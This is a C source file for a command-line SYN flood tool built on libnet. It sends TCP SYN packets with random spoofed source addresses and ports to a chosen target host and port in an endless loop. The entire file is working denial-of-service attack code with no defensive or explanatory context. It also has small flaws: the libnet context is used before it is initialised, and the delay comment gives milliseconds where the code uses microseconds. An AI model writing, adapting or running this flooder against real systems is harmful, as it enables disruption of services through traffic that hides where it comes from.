#include <stdio.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <unistd.h>
#include <stdlib.h>
#include <libnet.h>
#include <inttypes.h>

#define FLOOD_DELAY 5000    // delay between packet injects of 5000ms

void usage(char* name) {
    printf("Usage: %s <target address> <target port>", name);
    exit(1);
}

int main(int argc, char* argv[]) {
    libnet_t *l;
    const char* device = NULL;
    char errbuf[LIBNET_ERRBUF_SIZE];
    libnet_ptag_t tcp=0, ip=0;

    if(argc < 3) {
        usage(argv[0]);
    }

    printf("%s %s\n", argv[1], argv[2]);

    uint32_t dest_ip = libnet_name2addr4(l, (char*)argv[1], LIBNET_RESOLVE);
    uint16_t dest_port = (uint16_t)atoi(argv[2]);

    l = libnet_init(LIBNET_RAW4, device, errbuf);
    if(l==NULL) {
        fprintf(stderr, "Error creating libnet context");
        exit(1);
    }

printf("context created\n");
    int sp = libnet_seed_prand(l);

    printf("SYN flooding on %" PRIu32 "at port %" PRIu16"...\n", dest_ip, dest_port);
    // printf("while...");
    while(1) {
        tcp = libnet_build_tcp(
            libnet_get_prand(LIBNET_PRu16),
            dest_port,
            libnet_get_prand(LIBNET_PRu16),
            0,
            TH_SYN,
            7,
            0,
            0,
            LIBNET_TCP_H,
            NULL,
            0,
            l,
            tcp
        );

        if(tcp == -1) {
            fprintf(stderr, "unable to build TCP header: %s", libnet_geterror(l));
            exit(1);
        }
        // libnet_toggle_checksum() for creating invalid packets

        ip = libnet_build_ipv4(
            LIBNET_TCP_H + LIBNET_IPV4_H,
            0,
            libnet_get_prand(LIBNET_PRu16),
            0,
            127,
            IPPROTO_TCP,
            0,
            libnet_get_prand(LIBNET_PRu32),
            dest_ip,
            NULL,
            0,
            l,
            ip
        );

        if(ip == -1) {
            fprintf(stderr, "unable to build IP header: %s", libnet_geterror(l));
            exit(1);
        }

        if((libnet_write(l)) == -1) {
            fprintf(stderr, "Unable to send packet: %s", libnet_geterror(l));
            exit(1);
        }

        usleep(FLOOD_DELAY);
    }

    libnet_destroy(l);
    return 0;
}
